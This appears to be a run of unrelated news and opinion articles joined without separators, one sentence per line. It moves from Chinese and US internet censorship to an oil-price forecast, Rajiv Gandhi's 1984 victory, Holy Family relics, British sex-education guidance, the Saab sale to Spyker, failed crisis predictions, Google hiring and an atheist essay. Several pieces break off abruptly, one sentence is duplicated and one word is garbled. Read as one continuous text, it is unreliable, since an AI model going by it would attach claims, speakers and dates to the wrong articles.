While refusing to equate the behavior of China and the US when it comes to the Internet , Salon writer Glenn Greenwald nonetheless agreed with the basic argument about US hypocrisy .
If you want to see illegal spying in action , and with no consequences , look no further than the vast system of warrantless wiretapping that the US legalized long after the fact .
Message to Congress : grow a spine .
" It goes without saying that countries like China and Iran — along with many of our closest allies — are far more repressive of internal dissent than is the US , " writes Greenwald .
" But the role of the American Congress is supposed to be to check surveillance abuses by the US Government and to safeguard the privacy of American citizens inside the US Instead , they do the opposite : flamboyantly condemn transgressions by other governments ( at least the ones we do n't like ) while enabling , empowering and protecting our own government officials and private telecoms who illegally spy within our own country . "
Xinhua loves Ballmer .
Piling onto the " double standards " bandwagon , a Xinhua editorial says that " the United States often gossips about other countries ' policies on administering the Internet , but at the same time it takes similar measures to minimize the spread of illegal information .
That shows that the United States takes a strict line with other countries , but not with itself . "
But there 's a voice of sanity crying in the wilderness , and his name is Steve Ballmer of Microsoft .
" Noting that most countries exert some sort of control over information , Microsoft Chief Executive Steve Ballmer said Friday his company must comply with the laws and customs of any country where it does business , " writes Xinhua with approval .
Let 's make it a trade issue .
The First Amendment Coalition argues that censorship is a trade issue , and that the US should purse it with the World Trade Organization .
" The US can argue that China ’s ' Great Firewall ' — a system of filters and bottlenecks that effectively shutters the country within its own intranet — is an illegal restraint on international trade because it bars foreign companies from competing , via the Internet , in the vast Chinese market , " says the group .
" WTO sanctions have teeth because they can be enforced through other countries ’ raising of tariffs against Chinese exports .
China in other recent trade disputes has shown it will abide by WTO rulings it disagrees with ( reserving its right to request WTO rulings , to China ’s benefit , in other matters ) .
For the US government , playing the WTO card also demonstrates seriousness about curbing Chinese censorship , while confining the dispute to an international legal process and avoiding a direct confrontation with China . "
US using Twitter to turn Iran into bloodbath ?
Another People 's Daily article alleged that the Iranian dissatisfaction so evident in the wake of the recent national election has been ramped up by US cyberwar efforts .
" It was America that initiated Internet warfare , using YouTube videos and Twitter micro-blog misinformation to split , incite , and sow discord between the conservative and reform factions to bring about large - scale bloodshed in Iran , " said the piece .
The lighter side of censorship ?
It 's not just Internet porn that angers the authorities ; taking off one 's pants on the subway is also forbidden .
The Guangzhou Subway Company has banned " no pants " rides on its subway system .
" The public can't accept the act of removing pants inside subway cars , and the act will frighten some passengers , so we will forbid any such act from now on , " said an official .
A Double Dip
In 2010 , oil demand will resume its upward march .
OPEC will respond by increasing supply — but the lag will come too late to keep prices down as emerging - market consumption pushes them up .
In the extreme case , resurgent oil prices could drive the U.S. economy into a double - dip downturn .
Here ’s what to expect , and what a limited oil supply will mean for the United States and the world .
As the global economy recovers , oil demand will continue to strengthen from the 85 million barrels per day that it hit in November .
That ’s already 4 percent higher than it was at the recession ’s trough in May of last year .
As a result , inventories both onshore and offshore have begun to decline .
The number of tankers storing crude oil in the Gulf of Mexico , for example , fell to seven in October from a high of 22 in May .
Many rightly see this trend as a sign that recovery from the deepest recession in generations is happening .
But this nascent resurgence holds the seeds of its own destruction .
As oil prices rally , economic performance and employment could remain subpar , and a new recession might even be in the offing .
The investment bank Goldman Sachs has forecast oil to hit $ 90 per barrel in 2010 .
That would mean the United States would be spending 4.5 percent of its GDP on oil , putting the kind of burden on its economy that has historically triggered recessions .
According to an analysis prepared by my consulting firm , the U.S. economy has slipped into recession whenever crude oil consumption has exceeded 4 percent of GDP .
Not all countries will share the pain .
Oil producers will do quite well .
OPEC has described $ 75 to $ 80 per barrel as a " fair " price , and " fair " in this usage means " quite good . "
Of course , OPEC has no interest in a U.S. recession , either .
It will try to keep oil prices manageable and in 2010 will have the spare capacity to do so .
But OPEC tends to react with a lag , partly due to delays in data availability and in part due to sheer logistical complications .
Meanwhile , oil prices will keep slowly rising .
As they do , watch out .
Once higher prices help pull the Russian economy out of the doldrums , confidence will return to a Kremlin that has demonstrated a taste for power projection and Georgian real estate .
Critically , Georgia is home to the BTC pipeline , an oil - supply link between the South Caucasus and the West .
With such a prize in its grasp , Russia might be tempted to finish the job it started in 2008 .
Then there ’s China , a growing oil consumer whose fate is tied to the U.S. economy .
A struggling U.S. will thwart China ’s export - led strategy , causing Chinese leaders to focus on their domestic priorities .
The more distant future could be even worse .
Macquarie , a leading natural resources investment bank , sees worldwide oil - production capacity as having peaked in 2009 .
( Others , including my firm , forecast the peak coming around 2015 . )
So Obama may well find himself the United States ’ first peak - oil president , with all the challenges that entails .
Not only will the world order be realigning before him , but the constrained global oil supply will mean that finding alternatives to America ’s gas - guzzling ways is a matter of national survival .
1984 : Rajiv Gandhi wins landslide election victory
Rajiv Gandhi is claiming a landslide victory in the Indian general election .
With almost half the votes declared early this morning , it became apparent that his Congress ( Indira ) Party had taken 80 % of the seats and was well ahead of any opposition parties .
Although the final margin may be smaller , it is widely accepted that the Congress Party is likely to win a massive majority .
The opposition parties , which failed to unite against the Congress Party , have been all but wiped out , including the Hindu nationalist party , the BJP .
The BJP was expected to gain from the sectarian backlash following the assassination of Mr Gandhi 's mother and the previous Prime Minister , Indira Gandhi .
She was shot dead by her own Sikh bodyguards in October .
The news was not all good for the Congress Party , however : in the southern state of Andhra Pradesh , six cabinet ministers lost their seats to the Telgu Desam party .
The party 's leader , Chief Minister and veteran film star NT Rama Rao , defeated an attempt by Indira Gandhi to dismiss him in August .
' Mr Clean '
Mr Gandhi was told news of his triumph quietly at home in New Delhi , where he lives with his Italian - born wife , Sonia , and their two children .
His election follows two months as de facto prime minister since the death of his mother .
He has campaigned on an anti-corruption ticket , promising to rid the ruling Congress Party of a legacy of fraud and arrogance .
Known widely by his nickname of " Mr Clean " , Rajiv Gandhi is seen as a break with the past of the Congress Party , which has held power in India for most of the last 30 years .
He is also seen as more pragmatic than his mother , and more liberal towards business .
But his opponents have accused him of relying on the " sympathy vote " for his victory , and one opposition MP commented that Indira Gandhi was " ruling from the grave " .
Others point out his relative inexperience as a politician .
Until four years ago , he was an airline pilot , but was persuaded to give it up to go into politics by his mother after the death of his younger brother , Sanjay .
The veneration of holy relics has long been an easy target for Protestants , atheists , and just about anyone who did n’t fall into the hardcore Catholic fold .
Even the Church itself has downplayed the role of relics since the Vatican II reforms in the early 1960s .
But odd as it may be , relics are making a comeback .
Do n’t believe me ?
You should have witnessed the masses in England who turned out two months ago to pray in front of the bones of St.
Therese of Lisieux that were touring the country , or the crowds who gathered to see the bones of Mary Magdalene last month , taken on a U.S. tour by a French monk .
Today we may have health care , the lottery , and recreational drugs to help us get by .
But for the typical Christian in Medieval Europe , the sacred shards of bone , strands of hair , and flakes of skin were like calling Dial - a - Devotion straight to the promised land , tugging at a saint ’s leg in the hope the divine individual would talk up your request with the Big Man .
But in some rare cases , that piece of sanctified stiff might have belonged to the CEO of the celestial sphere himself — Jesus .
Or perhaps his mother .
Never mind that Jesus and the Virgin Mary ascended into heaven bodily ; that did n’t stop a few relics — both physical possessions and improbable body parts — from materializing on the spiritual landscape of Europe .
You ’ve heard of the Shroud of Turin and the many pieces of the True Cross , but unbeknownst to a lot of us , there were — and in many cases , still are — bits and pieces of the Holy Family on display and ready for your veneration .
Here are my 10 favorites .
10 . The Holy Swaddling Clothes
Shrine of the Virgin Mary , Aachen Cathedral .
It would seem relics of Jesus ’ infancy would be a rare commodity .
The heads of the Three Wise Men ( or Kings , as they ’re sometimes referred to ) — while not being a Jesus relic but associated with his birth — are housed in the grand gothic cathedral of Cologne , Germany ( even though they ’re only mentioned in Matthew and there ’s no number of these men given ) .
In the Basilica of Santa Maria Maggiore in Rome , one can eye Christ ’s crib , which today has been whittled down a few pieces of wood .
But one of the most remarkable Baby Jesus relics is his swaddling clothing .
A Holy Shroud of sorts for babies .
Relics scholar Joe Nickell recounts some of the miraculous experiences associated with the magical Holy Onesie in his book Relics of the Christ , noting that the clothes have reportedly exorcised demons from a young man and also burst into flames in order to scare away a dragon .
Today , the swaddling clothes can be found in Aachen , Germany , the town that was the HQ for the great Gallic king Charlemagne .
A tale attached to the clothing says that he attained it from the Holy Land .
Just leave your dragon at home .
9 . The Holy Girdle
Alongside Baby Jesus ’ swaddling clothes ( and the Virgin Mary ’s shroud ) , Jesus ’s loincloth is still prayed over in the Cathedral of Aachen .
But the Tuscan town of Prato has its own sartorial prize : the Holy Girdle , housed in the Pisano - designed Cathedral and in a chapel partially designed by Renaissance master Lorenzo Ghiberti .
The Holy Girdle is said to have made its way to Prato thanks to one of the many booty - loaded Crusaders who made their way back to Europe from the Holy Land .
The green girdle is displayed five times a year on major Catholic holidays .
8. The Holy Nails
A nail with reliquary in Trier , Germany .
Early Christian writers claimed that Jesus was crucified with four nails .
But like the pieces of the True Cross , the Holy Nails have been possessed with the gift of multiplying .
Nearly 30 towns in medieval Europe could claim one .
There was , of course , an explanation for this , as it was unclear if the provenance of said nail was one of the traditional four pounded into Jesus or if it was one of the ( presumably ) many that held together the True Cross .
Or , as some historians have suggested , just a nail that simply touched one of the real nails .
Whatever the case , there were enough of these going around that they seemed rather expendable : Saint Helena was said to have tossed a nail into the sea near Venice to calm a storm .
Her son , Constantine , the first Christian Roman emperor , supposedly affixed one to his war helmet .
Perhaps in a proto-MacGyver moment , he also refashioned one as a bit for his horse ’s bridle .
Today relic gawkers can spot a nail at relics - rich Santa Croce in Gerusalemme on the outskirts of Rome .
7. The Holy House
The Holy House , Vatican Museum .
One of the most magical relics is the House of Loretto , said to be the abode of the Virgin Mary .
According to legend , angels first carried it from the Holy Land to the Dalmatian Coast on May 10 , 1291 .
But , as the historians G. W. Foote and J. M.
Wheeler wrote in 1887 , “ [ I ]t was too precious a memorial of the true faith to be left there ; and after a rest of three years , during which its angelic conveyancers were perhaps recovering from the fatigue of their first journey , it suddenly and miraculously appeared in the Papal state of Loreto . ”
The Santa Casa , located 15 miles from Ancona , Italy , has become a regular pilgrimage site .
You can also find a “ replica ” of the Holy House in Prague .
6. The Holy Robe
Holy Robe , Trier Cathedral .
John writes in the Bible that after Christ was crucified , soldiers divided up his clothes .
The real prize was his seamless robe and after an argument over it , the soldiers settled by playing dice .
The next time the seamless robe appears is in a tale that Charlemagne gave it to the French town of Argenteuil .
The robe , however , was apparently stolen by left - wing terrorists in 1983 .
Thankfully , the German town of Trier has a Holy Seamless Robe as well , said to come from Saint Helena ’s fourth - century relic shopping spree in the Holy Land ( she also brought back Holy Nails , hunks of the True Cross , and the finger of doubting Saint Thomas , among many other relics ) .
The Cathedral in Trier — the oldest in Germany — trots out the robe on rare occasions .
In 1933 , the robe drew two million pilgrims .
It has been shown in public two other times since : in 1959 and 1996 .
5 . The Holy Blood
Basilica of the Holy Blood , Bruges , Belgium .
Medieval pilgrims had an insatiable thirst for the Holy Blood , which made crowds gasp and swoon and empty their pockets into church coffers .
The blood was assumed to have been spilled during Christ ’s crucifixion but strength in the belief of such provenance was best left to one ’s own faith .
Rome , of course , was a virtual Holy Blood bank ( in Santa Croce in Gerusalemme , in San Giovanni Laterano , and Santa Maria Maggiore ) .
So was — surprise , surprise — France ( Fecamp , Soissons ) .
Since the 12th century , though , the most notable claimant has been the Belgian town of Bruges .
Because the blood would liquefy for the faithful every Friday , Pope Clement V gave his official stamp of approval on the Bruges blood in 1310 with an indulgence to those who came to venerate it .
But after a blasphemy occurred later that year the blood refused to perform its weekly stunt , only liquefying once more in 1388 .
To this day , though , every May 21 the blood is the star of a lengthy procession through the streets of this handsome , gothic - clad city .
4. The Holy Umbilical Cord
It was written somewhere that the Virgin kept and coveted her son ’s umbilical cord .
She possessed it most of her life before handing it off to Saint John who , in turn , passed it along ( as the story goes ) to the Bishop of Ephesus .
But how versions of the Holy Navel ended up in the French towns of Lucques and Châlons - sur - Marne is a mystery , especially considering Rome had one , too .
The Eternal City ’s blessed belly button was kept in the Sancta Sanctorum ( the Holy of Holies ) along with the heads of Sts. Peter and Paul , a chunk of wood from the Last Supper ( which can still be seen tacked to the wall ) , and , until 1527 , the Holy Foreskin ( more on that later ) .
Today the Sacred Umblicus is nowhere to be seen — not that it might stop someone from discovering one at some point in the future .
Stay tuned .
3. The Holy Teardrop
Jesus ate , drank , clipped his toenails , relieved himself , and , as bumper stickers often proclaim , saved .
He also cried .
One of his most industrious followers who must have risked grave danger in leaping , vial in hand , to catch one of Jesus ’ tears before it hit the ground .
In fact , there were enough tears on display in European churches in the Middle Ages that Christ ’s sadder days must have caused a scramble among his disciples .
French towns Marseilles , Picardy , Orlean , and Auvergne , among others , all displayed depositories of sacred saline that were venerated .
Maximin - la - Sainte - Baume and Vendôme went a step further by giving provenance to their holy teardrops , claiming they were shed by Christ on the tomb of Lazarus .
All the holy teardrops have since dried up and vanished , many the victims of French Revolution fervor , but Vendôme pastry shops still sell chocolate teardrop - shaped cookies in homage to the town ’s now long evaporated tear .
2. Holy Breast Milk
“ Madonna with Four Saints , ” Rogier van der Weyden .
Throughout the centuries , the cult of the Virgin Mary has rivaled that of her son’s .
And so have her relics .
Like Jesus , Mary ascended bodily into heaven .
But that has n’t stopped creative devotees from unearthing bodily relics of the Virgin .
The most outrageous is her breast milk , which French scholar Nicole Hermann - Mascard traced to 69 sanctuaries , 46 of which were in France .
The part of a pilgrimage route that traveled through the English village of Walsingham was known as the Milky Way because of its fame for possessing a drop of the beloved latte .
“ Had the Virgin been a cow , ” wrote the 16th - century Protestant reformer John Calvin , “ she scarcely could not have produced such a quantity . ”
One lucky relic collector boasted the two - for - one relic : the Holy Bib , which contained stains of Mary ’s breast milk .
Calvin later added : “ I would fain to know how that milk . . . was collected ….
We do not read of any person who had the curiosity to undertake the task . ”
1. The Holy Foreskin
Circumcision of Christ , Preobrazhenski Monastery , Bulgaria .
As Catholic scholar James Bentley wrote of Holy Family curios : “ None , however , ranks in absurdity with the cult of …the Holy Foreskin . ”
There ’s only one reference to Jesus ’ circumcision in the Bible — in Luke 2:21 : “ And when eight days had passed , before His circumcision , His name was then called Jesus , the name given by the angel before he was conceived in the womb . ”
But as Jean Calvin quipped : “ They could n’t let Christ go without keeping a little piece of him . ”
The foreskin of Jesus has loomed on the periphery of many historical epics and movements , from the Carolingian legend to the Papal Schism to the Reformation to 19th - century Romanticism .
Though there were at least a dozen claimants to the Holy Foreskin ( as you ’d expect by now , most were in France ) , the papal - approved version was stolen during the 1527 Sack of Rome and ended up in the hill town of Calcata , 30 miles north of the Eternal City .
By the end of the 19th century , the relic fell out of favor with the church , highlighted by a papal decree in 1900 threatening excommunication to anyone who writes or speaks about the miraculous membrane .
Still , the relic remained in Calcata until 1983 when it was stolen under mysterious circumstances , leaving the villagers of Calcata with wild theories on its disappearance : that neo -Nazis , Satanists , and / or even the Vatican itself was to blame .

Seven - year - olds taught about homophobic and sexist bullying in new sex education curriculum
Seven - year - olds will be taught to oppose sexist and homophobic bullying in schools .
A shake - up of sex education will also see children learning to ' recognise and challenge stereotypes ' .
The guidelines on ' promoting equality , inclusion and acceptance of diversity ' are a key part of Labour 's push to spread sex education to more children .
Ministers have ordered that all primary schools should run sex education lessons because of a failure to hit a target of halving the number of teenage pregnancies .
Ministers have ordered that all primary schools should run sex education lessons because of a failure to hit a target of halving the number of teenage pregnancies
The Government also wants to make sex classes compulsory for 15 - year - olds .
Ed Balls , the Children 's Secretary , launched the guidelines yesterday , saying they would help young people ' understand the importance of marriage and other stable relationships ' .
They would also equip children to cope with television , the internet , films and magazines which persuade them toward having early sex , he said .
But parenting groups accused Mr Balls of social engineering , saying that lecturing about sexism or homophobia was not required when tackling bad behaviour by children .
The draft guidelines sent out yesterday say that children should be told from the age of five about the difference between bodies of boys and girls .
They should also learn ways of keeping safe .
Among questions children in their first terms in school will discuss to help them avoid abuse is : ' What is the difference between good touch and bad touch ? '
Teaching on diversity will become more specific for pupils from the age of seven .
The guidelines said : ' Many people still face unacceptable prejudice and discrimination on the basis of their sexuality or what they look like , and intolerance towards difference needs to be challenged .
' Sex and relationships education is an opportunity to explore the different views that children and young people hold , guided by a welltrained teacher . '
Labour introduced rules in 2000 saying that school sex education should support stable relationships and marriage .
Secretary of State for Children Ed Balls at a visit to the Harmwood Children 's Centre in north London
Mr Balls said : ' We want to give young people the facts so they can stay safe and healthy .
' We also want young people to understand the importance of marriage and other stable relationships - these are the bedrock of family life , the best way to bring up children and the kind of relationships we want young people to develop as they get older . '
But Norman Wells of Family and Youth Concern said : ' This guidance will confirm the fears of many parents that compulfromsory sex education will be used to indoctrinate their children into thinking that there are no moral absolutes when it comes to sexual expression .
' The vast majority of parents do n't want their children 's schools to present positive images of homosexuality under the guide of combating homophobic bullying .
' Nor do they want teachers to deny the differences between men and women in the name of addressing sexist bullying .
' It is not necessary to engage in social engineering in order to deal firmly with harsh or unkind words and actions , regardless of what motivates them . '
Mr Balls used the phrase social engineering this month to describe Tory pledges of tax support for married couples .
$ 74 million deal saves Saab
NEW YORK ( CNNMoney.com ) -- General Motor 's Swedish Saab brand has been saved from certain death thanks to a last - minute deal with Dutch exotic car builder Spyker .
Spyker has agreed to pay $ 74 million in cash and $ 326 million in preferred stock in a new Saab that will emerge from this deal .
The Swedish government has agreed to guarantee a $ 563 million ( 400 million Euro ) European Investment Bank loan for Saab .
Spyker , founded in 2000 , makes exotic sports cars costing more than $ 200,000 .
Only 250 have ever been sold .
This year , the carmaker hopes to sell 100 of its Spyker cars worldwide .
Spyker production was moved from the Netherlands to Great Britain late last year .
" Today 's announcement is great news for Saab employees , dealers and suppliers , great news for millions of Saab customers and fans worldwide , and great news for GM , " said John Smith , GM vice president for corporate planning and alliances , in a corporate announcement .
The deal is expected to close in mid-February , GM said .
As part of the deal , Spyker Cars will change its name to Saab Spyker Cars
" We are very much looking forward to being part of the next chapter in Saab 's illustrious history , " said Spyker CEO Victor Muller in statement .
" Saab is an iconic brand that we are honored to shepherd . "
Saab had been on the verge of launching two new models , a redesigned 9 - 5 mid-size car and the new 9 - 4X crossover SUV .
Those launches will now continue , Smith said , with GM providing parts and support .
The 9 - 5 is already being produced Sweden , Spyker said .
GM is producing the 9 - 4X , which is closely related to the new Cadillac SRX , in its Mexican factory .
Saab Spyker is expected to take over relationships with Saab's U.S. dealer network , Smith said .
Warranty support will continue without interruption , he said .
" A bright spot for Saab , and potentially why Spyker worked so hard to acquire it , is some of the solid new product in its GM - based pipeline , " said James Bell , an analyst with the Kelley Blue Book 's KBB.com .
Saab is one of four brands , along with Hummer , Saturn and Pontiac , that GM is dropping as it attempts to restructure itself since emerging from bankruptcy in June .
A deal to sell Saturn to the Penske Automotive Group fell through when Penske could not find a partner to supply cars for the brand .
A deal has been signed to sell Hummer to China 's Sichuan Tengzhong Heavy Industrial Machinery Co. , but that deal is on hold pending approval by the Chinese government .
No attempt was ever made to sell Pontiac .
Another supercar maker , Sweden 's Koenigsegg Group AB , had dropped negotiations to buy Saab in November .
Since the end of 2009 , Saab has officially been in a " wind down " mode even as GM said it was considering bids from outside investors , including Spyker , which has announced several revised offers in an attempt to reach a deal .
Spyker 's motto , emblazoned over the logo on their cars , which as an airplane propeller over an old fashioned wire car wheel , is " Nulla tenaci invia est via . "
( " For the tenacious , no road is impassable . " )

# Gratitude
We stand in awe and gratitude of the way people around the world have responded to the COVID - 19 crisis - from medical professionals , to workers who ensure our food supply , and those who keep our streets safe .
You are our heroes , and together , we ’re strong .
It Did n’t Happen
Just a few months ago , the consensus among influential thinkers was that the economic crisis would unleash a wave of geopolitical plagues .
Xenophobic outbursts , civil wars , collapsing currencies , protectionism , international conflicts , and street riots were only some of the dire consequences expected by the experts .
It did n’t happen .
Although the crash did cause severe economic damage and widespread human suffering , and though the world did change in important ways for the worse — the International Monetary Fund , for example , estimates that the global economy ’s new and permanent trajectory is a 10 percent lower rate of GDP growth than before the crisis — the scary predictions for the most part failed to materialize .
Sadly , the same experts who failed to foresee the economic crisis were also blindsided by the speed of the recovery .
More than a year into the crisis , we now know just how off they were .
From telling us about the imminent collapse of the international financial system to prophecies of a 10 - year recession , here are six of the most common predictions about the crisis that have been proven wrong :
The international financial system will collapse .
It did n’t .
As Lehman Brothers , Bear Stearns , and Fannie Mae and Freddie Mac crashed , as Citigroup and many other pillars of the financial system teetered on the brink , and as stock markets everywhere entered into free fall , the wise men predicted a total system meltdown .
The economy has " fallen off a cliff , " warned investment guru Warren Buffett .
Fellow financial wizard George Soros agreed , noting the world economy was on " life support , " calling the turbulence more severe than during the Great Depression , and comparing the situation to the demise of the Soviet Union .
The natural corollary of such doomsday scenarios was the possibility that depositors would lose access to the funds in their bank accounts .
From there to visions of martial law imposed to control street protests and the looting of bank offices was just an easy step for thousands of Internet - fueled conspiracy theorists .
Even today , the financial system is still frail , banks are still failing , credit is scarce , and risks abound .
But the financial system is working , and the perception that it is too unsafe to use or that it can suddenly crash out of existence has largely dissipated .
The economic crisis will last for at least two years and maybe even a decade .
It did n’t .
By fall of 2009 , the economies of the United States , Europe , and Japan had begun to grow again , and many of the largest developing economies , such as China , India , and Brazil , were growing at an even faster pace .
This was surely a far cry from the doom - laden — and widely echoed — prophecies of economist Nouriel Roubini .
In late 2008 he warned that radical governmental actions at best would prevent " what will now be an ugly and nasty two - year recession and financial crisis from turning into a systemic meltdown and a decade - long economic depression . "
Roubini was far from the only pessimist .
" The danger , " warned Harvard University ’s Kenneth Rogoff , another distinguished economist , in the fall of 2008 , " is that instead of having a few bad years , we ’ll have another lost decade . "
It turned out that radical policy reactions were far more effective than anyone had expected in shortening the life of the recession .
The U.S. dollar will crash .
It did n’t .
Instead , the American currency ’s value increased 20 percent between July 2008 and March 2009 , at the height of the crisis .
At first , investors from around the world sought refuge in the U.S. dollar .
Then , as the U.S. government bailed out troubled companies and stimulated the economy with aggressive public spending , the U.S. fiscal deficit skyrocketed and anxieties about a dollar devaluation mounted .
By the second half of 2009 , the U.S. currency had lost value .
But devaluation has not turned out to be the catastrophic crash predicted by the pessimists .
Rather , as Financial Times columnist Martin Wolf noted , " The dollar ’s correction is not just natural ; it is helpful .
It will lower the risk of deflation in the U.S. and facilitate the correction of the global ‘ imbalances ’ that helped cause the crisis . "
Protectionism will surge .
It did n’t .
Trade flows did drop dramatically in late 2008 and early 2009 , but they started to grow again in the second half of 2009 as economies recovered .
Pascal Lamy , director - general of the World Trade Organization , had warned that the global financial crisis was bound to lead to surges in protectionism as governments sought to blame foreigners for their problems .
" That is exactly what happened in the 1930s when [ protectionism ] was the virus that spread the crisis all over the place , " he said in October 2008 , echoing a widely held sentiment among trade experts .
And it is true that many governments dabbled in protectionism , including not only the U.S. Congress ’s much - derided " Buy American " provision , but also measures such as increased tariffs or import restrictions imposed in 17 of the G - 20 countries .
Yet one year later , a report from the European Union concluded that " a widespread and systemic escalation of protectionism has been prevented . "
The protectionist temptation is always there , and a meaningful increase in trade barriers cannot be ruled out .
But it has not happened yet .
The crisis in rich countries will drag down developing ones .
It did n’t .
As the economies of America and Europe screeched to a halt during the nightmarish first quarter of 2009 , China ’s economy accelerated , part of a broader trend in which emerging markets fared better through the crisis than the world ’s most advanced economies .
As the rich countries entered a deep recession and the woes of the U.S. financial market affected banking systems everywhere , the idea that emerging economies could " decouple " from the advanced ones was widely mocked .
But decouple they did .
Some emerging economies relied on their domestic markets , others on exports to other growing countries ( China , for example , displaced the United States last year as Brazil ’s top export market ) .
Still others had ample foreign reserves , low exposure to toxic financial assets , or , like Chile , had taken measures in anticipation of an eventual global slowdown .
Not all developing countries managed to escape the worst of the crisis — and many , such as Mexico and Iran , were deeply hurt — but many others managed to avoid the fate of the advanced economies .
Violent political turmoil will become more common .
It did n’t .
Electorates did punish governments for the economic hard times .
But this was mostly in Europe and mostly peaceful and democratic .
" There will be blood , " prophesied Harvard historian Niall Ferguson last spring .
" A crisis of this magnitude is bound to increase political [ conflict ] …
It is bound to destabilize some countries .
It will cause civil wars to break out that have been dormant .
It will topple governments that were moderate and bring in governments that are extreme .
These things are pretty predictable . "
No , it turns out :
They are n’t .
Supernova Google vice president Bradley Horowitz has indicated the web giant avoids hiring too many talented minds in an effort to keep the rest of the tech world from going to ruin .
The setting was the annual Supernova tech pow - wow in San Francisco , California , where Harvard professor and Berkman Center for Internet & Society co-director Jonathan Zittrain walked the gathered tech heads through a condensed list of the pitfalls facing purveyors of so - called cloud computing .
These ranged from mass user data loss along the lines of Microsoft 's Sidekick snafu , to the sort of philosophical quandary that enveloped Amazon when its Kindle ebook reader flushed George Orwell down an Orwellian memory hole .
And at the end of it all , Horowitz was asked how Google manages to navigate this ever - changing online landscape .
Naturally , he responded with the usual boiler plate about the saintliness of the company 's leaders .
" The management at Google , in my experience , is extremely truthful and principled about these things , " he said .
" Issues are n't relegated to a policy department .
My management cares passionately about this , and in fact , they 're intimately involved in discussing [ these issues ] in the hallways of Google . "
But he also likes it that there are people outside the company questioning its policies .
" I 'm equally glad that there are scholars who think about this stuff and keep us as an industry - Google and Amazon and others - quite honest and on our toes , " he said .
" These issues require a lot of deep thought , and we 're grateful for those in Google and those beyond Google to continue this discussion . "
Apparently , Google is so concerned with others keeping it on its toes , it avoids hiring too many of the industry 's leading brains .
" I recently had a discussion with an engineer at Google and I pointed out a handful of people that I thought were fruitful in the industry and I proposed that we should hire these people , " Horowitz told today 's conference .
" But [ the engineer ] stopped me and said : ' These people are actually important to have outside of Google .
They 're very Google people that have the right philosophies around these things , and it 's important that we not hire these guys .
It 's better for the ecosystem to have an honest industry , as opposed to aggregating all this talent at Google . ' "
Read that again .
It 's worth it .
Bootnote
All we can do at this point is go back to Jonathan Zittrain , who is one of the few people to speak the truth about Amazon 's Orwellian memory hole .
He praised Amazon chief executive Jeff Bezos for so openly apologizing for deleting copies of Orwell 's 1984 and Animal Farm from user Kindles because they were sold without the approval of the copyright holder .
But rightly , he pointed out that Amazon was remiss in saying that the company will never do it again .
" It 's one of the best apologies I 've ever read .
It 's a great apology , " Zittrain said .
" The problem is what Amazon said after this , which was that it would never do something like that again .
It made me feel great - until I realized they 'd lied to people .
What happens if the government forces them to ?
When a federal judge knocks on the door in Seattle and says : ' Here 's the order that says you must delete X or X page from this work because it infringes copyright , because it 's defamatory , etc . '
" Can you imagine if Amazon responded with : ' Well , we promised we would n't do that ' ? "
Amazon has shown they can do it .
And now they can be forced to .
As we 've said before . ®

In conversations between atheists and believers , is there any way atheists can win ?
I 've been in a lot of discussions and debates with religious believers in the last few years .
And I 'm beginning to notice a pattern .
I 've been noticing the ways that believers put atheists in no -win situations : the ways that , no matter what atheists do , we 'll be seen as either acting like jerks or conceding defeat .
Like so many rhetorical gambits aimed at atheists , these " damned if you do , damned if you do n't " tactics are n't really valid criticisms of atheism .
They really only serve to deflect valid questions and criticisms about religion .
But they come up often enough that I want to spend a little time pointing them out .
I want to spell out the exact ways that these " no - win " situations are both unfair and inaccurate .
And I want to point out the general nature of this " no - win " pattern -- in hopes that in future debates with atheists , believers will be more aware of them , and will play a little more fairly .
When atheists focus our critiques on conservative or extremist religions , we get accused of ignoring the tolerant progressive ones , and lumping all religions together .
But when we do criticize progressive or moderate religions , we 're accused of mean - spirited overkill , of alienating people who could be our allies .
Why this is untrue and unfair :
It does n't make much sense to assume that the atheist critique of religion you 're reading that moment is the only atheist critique of religion this writer has ever come up with .
Most atheist writers who criticize religion do so many times , and from many angles .
We critique extremist fundamentalism , and moderate ecumenicalism .
We critique specific religious beliefs and practices , and the general belief in the supernatural .
It 's not " lumping all religions together " to point out the flaws and hypocrisies and evils committed by one in particular .
So if we 're writing about the harm done by gay - hating fundamentalism or the pedophile - enabling Catholic Church , please do n't complain that we 're " lumping all religions together . "
We 're not talking about your religion .
We did that last week .
And yes , we can criticize progressive religions and still be their allies on issues we agree on .
Just like any movement can be critical of other movements and still work with them as allies .
When atheists criticize Christianity , we get accused of being cowards for not criticizing Islam .
But when we criticize Islam , we get accused of cultural insensitivity .
Why this is untrue and unfair :
And I say yet again :
It 's neither fair nor reasonable to assume that the atheist critique you 're reading right that second is the only one this atheist has ever written .
If an atheist is criticizing Christianity today , that does n't mean they did n't criticize Islam last week .
Most American atheists do focus our attentions largely on Christianity -- mainly because it 's the religion that 's most in our face on a daily basis .
But I do n't know of any serious atheist writer who has n't criticized Islam .
I certainly have .
I 've criticized Islam , Judaism , Mormonism , fundamentalist Christianity , progressive Christianity , Hinduism , Wicca , Baha'i , and that religion that worships a blue peacock .
To name but a few .
As for cultural insensitivity in criticizing Islam ... well , given how Islam and Islamic theocracies have historically treated women and gays , I 'd call it culturally insensitive not to criticize it .
I agree that some atheists can be racist , xenophobic jerks ( especially on the Internet -- the Internet does seem to bring the racist , xenophobic jerks out of the woodwork , from every group ) .
But to slam as " culturally insensitive " any criticism of Islam as it's widely and commonly practiced ... that 's pretty freaking insensitive to the people who are victimized by it .
When atheists focus our critiques on ordinary religious beliefs held by the majority of people , we get accused of ignoring advanced modern theology and focusing on outdated beliefs that nobody takes seriously anymore .
But when atheists do argue against modern theology , we get accused of elitism .
What 's more , when we argue against Modern Theologian A , we 're accused of ignoring Modern Theologian B... and when we argue against Modern Theologian B , we 're accused of ignoring Modern Theologian C... in an infinite regress of movable goalposts .
Why this is untrue and unfair :
Most atheist activists do n't care very much about religion as it's practiced by a handful of modern theology scholars .
If all religion were the religion of modern theology scholars ... well , we still would n't agree with it , but we probably would n't bother putting much energy into arguing with it .
We care about religion as it's believed and practiced by the overwhelming majority of people who believe it .
By definition , those beliefs are not outdated .
A belief in a personal interventionist creator god who answers prayers and doles out punishment and reward in the afterlife ... that is not an outdated belief .
It 's what most believers believe in .
Even belief in faith healing , demonic possession , magical objects and substances ... these are still widespread , around the country and around the world .
Heck , nearly half of all Americans believe in young - earth Creationism .
When atheists battle these beliefs , we are not fighting straw men .
We are fighting real beliefs and practices , with real effects on people 's lives .
And as it happens , many atheists are familiar with modern theology .
And we 're really not impressed .
How much of it do we have to read before we 're allowed to conclude that it makes no sense ?
When atheists attempt to present an organized , unified front , we get accused of being Stalinist group - think robots .
